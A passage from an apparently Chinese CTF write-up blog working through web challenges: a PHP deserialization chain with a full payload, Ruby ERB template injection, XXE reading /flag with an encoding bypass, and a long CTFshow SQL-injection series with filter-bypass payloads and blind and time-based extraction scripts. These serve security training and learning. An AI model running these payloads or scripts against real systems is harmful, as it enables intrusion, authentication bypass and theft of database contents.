\"你的ID是\".$_SESSION['id'];\n        echo \"你好！\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'</script>\";\n        return $this->id;\n        }\n    }\n}\n    public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n    public function __destruct(){\n        return file_get_contents($this->nickname);//危\n    }\n    public function __toString()\n    {\n        $this->nickname->update($this->age);\n        return \"0-0\";\n    }\n}\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name;\n    public $password;\n    public $mysqli;\n    public $token;\n    public function __construct()\n    {\n        $this->name=$_POST['username'];\n        $this->password=$_POST['password'];\n        $this->token=$_SESSION['token'];\n    }\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n    public function update($sql)\n    {\n        //还没来得及写\n    }\n}\n\n```\n\n\n\n```php\n//update.php\n<?php\nrequire_once('lib.php');\necho '<html>\n<meta charset=\"utf-8\">\n<title>update</title>\n<h2>这是一个未完成的页面，上线时建议删除本页面</h2>\n</html>';\nif ($_SESSION['login']!=1){\n\techo \"你还没有登陆呢！\";\n}\n$users=new User();\n$users->update();\nif($_SESSION['login']===1){\n\trequire_once(\"flag.php\");\n\techo $flag;\n}\n?>\n```\n\n可以看到update.php中不论session的判断结果如何都会执行类中update方法，并且如果想获取flag就需要让`$_SESSION['login']===1`或者`$_SESSION['token']==='admin'`\n\n```PHP\nclass dbCtrl{    \n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n}\n```\n\n发现其中可以对token进行修改，而后查看调用链\n\n```PHP\nclass Info{\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);//CtrlCase=new dbCtrl;\n    }\n}\n```\n\nInfo中的`__call`方法能调用`login`方法\n\n```PHP\nclass User\n{\n    public function __toString()\n    {\n        $this->nickname->update($this->age);//nikename=new Info;\n        return \"0-0\";\n    }\n}\n```\n\nUser中的`__toString`方法调用`__call`方法\n\n```PHP\nClass UpdateHelper{\n    public function __destruct()\n    {\n        echo $this->sql;//sql=new User;\n    }\n}\n```\n\n链子：`UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`\n\n下一步就是构造payload了，反序列化所使用的方法是\n\n```PHP\npublic function update(){\n    $Info=unserialize($this->getNewinfo());\n}\npublic function getNewInfo(){\n    $age=$_POST['age'];\n    $nickname=$_POST['nickname'];\n    return safe(serialize(new Info($age,$nickname)));\n}\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n```\n\n由于题中先对传入参量进行info序列化而后再通过safe函数进行反序列化，所以最终链子其实变成了`Info::任意参量=UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`，并且这是一个字符逃逸的序列化\n\n```php\n//exp.php\n<?php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n}\nclass User\n{\n    public $id=\"1\";\n    public $age='select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?';\n    public $nickname;\n}\nClass UpdateHelper{\n    public $sql;\n}\n\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name=\"admin\";\n    public $password=\"1\";\n    public $mysqli;\n    public $token;\n    public $feng;\n}\n$a=new Info();\n$a->CtrlCase=new UpdateHelper();\n$a->CtrlCase->sql=new User();\n$a->CtrlCase->sql->nickname=new Info();\n$a->CtrlCase->sql->nickname->CtrlCase=new dbCtrl();\nfor($i=1;$i<=95;$i++){\n    echo \"'\";\n}\n?>\";s:8:\"nickname\";N;s:8:\"CtrlCase\";O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";s:1:\"1\";s:3:\"age\";s:72:\"select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":9:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";N;s:4:\"feng\";N;}}}}}\n```\n\n传入age，任意密码登录admin即可\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-19 00.37.26.png)\n\n## [b01lers2020]Life on Mars\n\n抓包随便点一个东西，发现传参，测试是sql注入\n\nsqlmap和手动注入都可以，发现当前数据库下没有结果，在另外一个`alien_code`数据库中\n\n最终payload\n\n```\n\n```\n\n\n\n\n\n## [SCTF2019]Flag Shop\n\n本来以为是jwt直接破解或伪造，没想到是代码审计，我还不认识//////////，是ruby的模版注入，在robots.txt中能看到源代码位置\n\n```ruby\nrequire 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\n\nset :public_folder, File.dirname(__FILE__) + '/static'\n\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\n\nconfigure do\n  enable :logging\n  file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\n  file.sync = true\n  use Rack::CommonLogger, file\nend\n\nget \"/\" do\n  redirect '/shop', 302\nend\n\nget \"/filebak\" do\n  content_type :text\n  erb IO.binread __FILE__\nend\n\nget \"/api/auth\" do\n  payload = { uid: SecureRandom.uuid , jkl: 20}\n  auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\n  cookies[:auth] = auth\nend\n\nget \"/api/info\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\n\nget \"/shop\" do\n  erb :shop\nend\n\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n\npost \"/shop\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n\n  if auth[0][\"jkl\"] < FLAGPRICE then\n\n    json({title: \"error\",message: \"no enough jkl\"})\n  else\n\n    auth << {flag: ENV[\"FLAG\"]}\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    json({title: \"success\",message: \"jkl is good thing\"})\n  end\nend\n\n\ndef islogin\n  if cookies[:auth].nil? then\n    redirect to('/shop')\n  end\nend\n```\n\n看到使用了REB包，是[ruby/erb的模版注入](ruby/erb的模版注入)\n\n大概内容就是使用`<%=`标签可以执行ruby语句并将结果转换为字符串，而题中有 `if params[:do] == \"#{params[:name][0,7]} is working\" then`这句判定，在判定相等的时候会返回`#{params[:name][0,7]} working successfully!`，我们如果把name位置构造成我们想要的参量就可以拿到我们想要的内容\n\n尝试传入$0（当前运行app名称）发现回显成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-16 23.23.05.png)\n\n|      |                                                              |\n| ---- | ------------------------------------------------------------ |\n| 1    | **$！**提出的最后一个异常对象。也可以在*rescue*子句中使用=>来访问异常对象。 |\n| 2    | **$ @**堆栈*回溯*募集的最后一个异常。堆栈*回溯*信息可以通过Exception＃backtrace方法检索最后一个异常。 |\n| 3    | **$ /**输入记录分隔符（默认为换行符）。*获取，readline*等，将他们的输入记录分隔符作为可选参数。 |\n| 4    | **$** 输出记录分隔符（默认为nil）。                          |\n| 5    | **$，**要打印的参数和Array＃join之间的输出分隔符（默认为nil）。您可以将数组明确指定给Array＃join。 |\n| 6    | **$;**split的默认分隔符（默认为nil）。您可以为String＃split指定明确的分隔符。 |\n| 7    | **$。**从当前输入文件读取的最后一行的编号。相当于ARGF.lineno。 |\n| 8    | **$ <**ARGF的同义词                                          |\n| 9    | **$>**$ defout的同义词。                                     |\n| 10   | **$ 0**正在执行的当前Ruby程序的名称。                        |\n| 11   | **$$**正在执行的当前Ruby程序的进程pid。                      |\n| 12   | **$？**最后一个进程的退出状态终止。                          |\n| 13   | **$：**$ LOAD_PATH的同义词。                                 |\n| 14   | **$ DEBUG**如果指定了-d或--debug命令行选项，则为true。       |\n| 15   | **$ defout***print*和*printf*的目标输出（默认*为$ stdout*）。 |\n| 16   | **$ F**指定-a时接收*分割*输出的变量。如果指定-a命令行选项以及-p或-n选项，则设置此变量。 |\n| 17   | **$ FILENAME**目前正在从ARGF读取的文件的名称。相当于ARGF.filename。 |\n| 18   | **$ LOAD_PATH**一个数组，用于加载和要求方法加载文件时要保存要搜索的目录。 |\n| 19   | **$ SAFE**安全级别0→不对外部提供（污染）数据执行检查。（默认）1→禁止使用污染数据的潜在危险操作。2→禁止对进程和文件进行潜在危险的操作。3→所有新创建的对象都被认为是污染的。4→禁止修改全局数据。 |\n| 20   | **$ stdin**标准输入（默认为STDIN）。                         |\n| 21   | **$ stdout**标准输出（默认为STDOUT）。                       |\n| 22   | **$ stderr**标准错误（默认为STDERR）。                       |\n| 23   | **$ VERBOSE**如果指定了-v，-w或--verbose命令行选项，则为True。 |\n| 24   | **$ - x**解释器选项-x（x = 0，a，d，F，i，K，l，p，v）的值。这些选项列在下面 |\n| 25   | **$ -0**解释器选项-x的值和$ /的别名。                        |\n| 26   | **$ -a**解释器选项-x的值，如果选项-a被设置，则为true。只读。 |\n| 27   | **$ -d**解释器选项-x的值和$ DEBUG的别名                      |\n| 28   | **$ -F**解释器选项-x和别名$ ;.                               |\n| 29   | **$ -i**解释器选项-x和in-place-edit模式的值保存扩展名，否则为nil。可以启用或禁用就地编辑模式。 |\n| 30   | **$ -I**解释器选项-x的值和$：的别名。                        |\n| 31   | **$ -l**解释器选项-x的值，如果选项-lis设置为true。只读。     |\n| 32   | **$ -p**解释器选项-x的值，如果选项-pis设置为true。只读。     |\n| 33   | **$ _**局部变量，最后一个字符string通过gets或readline在当前作用域中读取。 |\n| 34   | **$〜**与最后一场比赛相关的局部变量*MatchData*。Regex＃match方法返回最后一个匹配信息。 |\n| 35   | **$ n（$ 1，$ 2，$ 3 ...）**在最后一个模式匹配的第n组中匹配的字符string。相当于m [n]，其中m是*MatchData*对象。 |\n| 36   | **$＆**在最后一个模式匹配中匹配的字符string。相当于m [0]，其中m是*MatchData*对象。 |\n| 37   | **$'**在最后一个模式匹配的匹配之前的字符string。相当于m.pre_match，其中m是*MatchData*对象。 |\n| 38   | **$\"**匹配后的字符string在最后一个模式匹配。相当于m.post_match，其中m是MatchData对象。 |\n| 39   | **$ +**与最后一个模式匹配的最后一个成功匹配的组对应的字符string。 |\n\n这里我们使用第37个，因为在上面最后一次匹配的就是我们想要的密钥\n\npayload：\n\n```\nSECRET=&name=%3C%25%3D%24'%25%3E&do=%3C%25%3D%24'%25%3E%20is%20working\n```\n\n拿到密钥，直接改钱拿flag\n\n## [GKCTF 2021]easycms\n\n提示说后台5位弱口令，点登录注册都没啥反应，推测可能是后台界面，/admin.php，admin/12345登录成功\n\n下一步在设计——主题中，对主题进行编辑后可以导出主题，存在任意文件读取漏洞，直接将theme参量换成base64(/flag)即可\n\n还有另一种方式，在设计——自定义——首页——编辑中可以自行添加php代码，此时需要我们添加文件来验证身份，在设计——组件——素材库——上传素材中存在目录穿越，传入../../../../../system/tmp/xxxx即可，最后保存访问主页就行\n\n## [强网杯 2019]Upload\n\n注册登录，上传测试，发现上传后文件都会被重命名并且后缀被更改为png，估计也没啥上传办法了，看一下cookie，发现是一串banse64编码后的序列化字符串，解码发现其中有头像img文件路径，尝试目录穿越读取文件，失败\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-17 11.35.50.png)\n\n扫！得到源码\n\n```php\nclass Index extends Controller\n{\n    public $profile;\n    public $profile_db;\n\n    public function index()\n    {\n        if($this->login_check()){\n            $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/home\";\n            $this->redirect($curr_url,302);\n            exit();\n        }\n        return $this->fetch(\"index\");\n    }\n    public function home(){\n        if(!$this->login_check()){\n            $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\";\n            $this->redirect($curr_url,302);\n            exit();\n        }\n        if(!$this->check_upload_img()){\n            $this->assign(\"username\",$this->profile_db['username']);\n            return $this->fetch(\"upload\");\n        }else{\n            $this->assign(\"img\",$this->profile_db['img']);\n            $this->assign(\"username\",$this->profile_db['username']);\n            return $this->fetch(\"home\");\n        }\n    }\n    public function login_check(){\n        $profile=cookie('user');\n        if(!empty($profile)){\n            $this->profile=unserialize(base64_decode($profile));\n            $this->profile_db=db('user')->where(\"ID\",intval($this->profile['ID']))->find();\n            if(array_diff($this->profile_db,$this->profile)==null){\n                return 1;\n            }else{\n                return 0;\n            }\n        }\n    }\n    public function check_upload_img(){\n        if(!empty($this->profile) && !empty($this->profile_db)){\n            if(empty($this->profile_db['img'])){\n                return 0;\n            }else{\n                return 1;\n            }\n        }\n    }\n    public function logout(){\n        cookie(\"user\",null);\n        $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\";\n        $this->redirect($curr_url,302);\n        exit();\n    }\n    public function __get($name)\n    {\n        return \"\";\n    }\n}\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [CSAWQual 2019]Web_Unagi\n\n就差告诉你XXE了，尝试上传一哈\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY kkk SYSTEM \"file:///flag\">\n]>\n<users>\n<user>\n<username>alice</username>\n<password>passwd1</password>\n<name>&kkk;</name>\n<email>alice@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n<user>\n<username>bob</username>\n<password>passwd2</password>\n<name>Bob</name>\n<email>bob@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n</users>\n```\n\n被WAF拦截了，选择编码绕过\n\n> 除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。\n> 更多信息：https://www.w3.org/TR/xml/#sec-guessing\n> 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。\n> 在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。\n> 外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。\n\n使用命令更改编码\n\n```shell\ncat 1.xml | iconv -f UTF-8 -t UTF-16BE > x16.xml\n```\n\n记得吧内容放到intro中，不然会被裁切\n\n"},{"title":"CTFshow_观星","url":"/posts/21090.html","content":"\n上来就很明显了，是sql注入，尝试单引号闭合\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12 22.17.52.png)\n\n被过滤了\n\n测试后发现过滤内容如下：\n\n```\n该字符是非法字符: union\n该字符是非法字符: and\n该字符是非法字符: sleep\n该字符是非法字符: limit\n该字符是非法字符: by\n该字符是非法字符: like\n该字符是非法字符: char\n该字符是非法字符: ascii\n该字符是非法字符: handler\n该字符是非法字符: benchmark\n该字符是非法字符: '\n该字符是非法字符: \"\n该字符是非法字符: ~\n该字符是非法字符: `\n该字符是非法字符: =\n该字符是非法字符: 空格\n```\n\n常规的sql盲注payload大致为：id=1^if(ascii(substr(database(),1,1))=102,2,3)\n\n1^2=3\n\n1^3=2\n\n到此，给出一些绕过方法，首先是空格可以使用括号或者/**/代替，然后ascii可以使用ord代替，substr中的逗号可以使用substr(字符串 from 1 for 1)来代替使用，if中的逗号可以为使用case语句代替，等于号和like可以用regexp代替，最终替换出的语句如下\n\nid=1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\n\n脚本如下：\n\n```python\n#CTFshow_观星.py\nimport requests\n\nurl = \"http://411c2277-fdd1-4c6d-a294-dddbb8c3579d.challenge.ctf.show/?id=\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm1234567890\"\nfor i in range(1, 50):\n    for j in flagchar:\n        #payload=f\"1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\" 库名：web1\n        #payload=f\"1^case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" 表名：flag\n        #payload=f\"1^case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" 列名：flag\n        payload = f\"1^case(ord(substr((select(group_concat(flag))from(flag))from({i})for(1))))when({ord(j)})then(2)else(3)end\"\n        tex=requests.get(url=url+payload).text\n        if \"I asked nothing\" in tex:\n            print(j,end='')\n            break\n\n```\n\n"},{"title":"CTFshowSQL注入","url":"/posts/38885.html","content":"\n**171**\n\n入门开始，直接union select\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**172**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user2\n0' union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+\n```\n\n**173**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user3\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+\n```\n\n**174**\n\n返回内容中不能有数字了，试试布尔注入吧\n\nselect * from tableName limit i,n\n\ni为索引，n为数量\n\n随便写的垃圾脚本\n\n```python\nimport requests\nurl=\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45,57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n```\n\n**175**\n\n啥都没了时间盲注\n\n```python\nimport requests\nurl=\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45, 57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url = f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url, timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url=f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url,timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n\n```\n\n或者试试文件读写\n\n```\n1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+\n```\n\n**176**\n\n过滤了union select，大小写绕过或万能密码`1' or 1=1--+`\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**177**\n\n过滤了空格，/**/即可，不能用+，url会被转成空格\n\n```\n0'/**/union/**/select/**/1,2,group_concat(password)/**/from/**/ctfshow_user%23\n```\n\n**178**\n\n过滤了空格和*，制表符%09绕过\n\n```\n0'%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23\n```\n\n**179**\n\n%09也没了，还剩%0c\n\n```\n0'%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23\n```\n\n**180**\n\n真没招了，看看wp，通过反引号分割，绝\n\n```\n0'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3\n```\n\n还有\n\n```\n0'or(id=26)and'1'='1\n```\n\n**181**\n\nselect不见了，万能密码\n\n```\n0'%0cor%0cid='26\n```\n\n**182**\n\nflag不见了，其实不影响上面的，但是还是可以尝试模糊匹配\n\n```\n0'%0cor%0cusername%0clike%0c'%fla%\n```\n\n**183**\n\n使用正则表达式和布尔盲注\n\n```\nWHERE email REGEXP 'a'\n```\n\n意思是在email中匹配a的\n\n写脚本咯\n\n```python\nimport requests\nurl = 'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 1;\" in tex:\n        \tprint(j,end='')\n```\n\n**184**\n\nRIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中没有匹配的行。\n\n```\nSELECT column_name(s)\nFROM table_name1\nRIGHT JOIN table_name2\n```\n\n我们将匹配后的表作为右表，使用正则查询即可\n\n`ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))`\n\n```python\nimport requests\nurl = 'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n\n```\n\n记得问on是啥意思\n\n**185**\n\n过滤了数字，用true=1相加构造数字咧\n\n```python\nimport requests\nurl = 'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\ndef lo(x):\n    tmp=\"true\"\n    for i in range(1,x):\n        tmp=tmp+\"+true\"\n    return tmp\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,({lo(i)}),(true))regexp(char({lo(ord(j))})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n```\n\n**186**\n\n同上，开打就完了\n\n**187**\n\n针对`md5(xxx,true)`的绕过：[链接](https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450)\n\n只能寻找md5\n\n所以密码输入:ffifdyop即可\n\n进行运算得出的结果为\n\n'or'6�]��!r,��b\n\n由于or后面6为真，所以语句恒为真\n\n**188**\n\nSQL比较真真离谱\n\n字符串当作数字处理\n\n即当mysql中字符串与数字做比较的时候，会将字符串当作数字来比较。如123bac会当作123处理。  因此我们在查询的时候即使username=0，也会返回一些以0开头的数据。\n\n00即可\n\n**189**\n\n空格消失法，提示flag在api/flag.php中，必然要读取文件咯\n\n尝试用户名发现只有两种回显结果，一种是查询失败，一种是密码错误\n\n布尔盲注走起\n\n```python\nimport requests\nurl = 'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f'if(load_file(\"/var/www/html/api/index.php\")regexp(\\'{tmp}\\'),0,1)#','password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**190**\n\n进行一个布尔的盲注\n\n```python\nimport requests\nurl = 'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and ((substr((select f1ag from ctfshow_fl0g),{i},1))='{j}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**191**\n\n过滤了file|into|ascii上个脚本还能用\n\n**192**\n\n过滤了file|into|ascii|ord|hex继续用\n\n**193**\n\n过滤了file|into|ascii|ord|hex|substr问题不大，换left\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'\nflagstr = r\",{flqazwsxedcrvtgbyhnujmikolp-0123456789}_\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and (left((select f1ag from ctfshow_flxg),{i})='{tmp}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**194**\n\n我谢谢你啊left和right都没了\n\n过滤了file|into|ascii|ord|hex|substr|char|left|right|substring，用like或者正则（其实用mid也行）\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'\nflagstr = 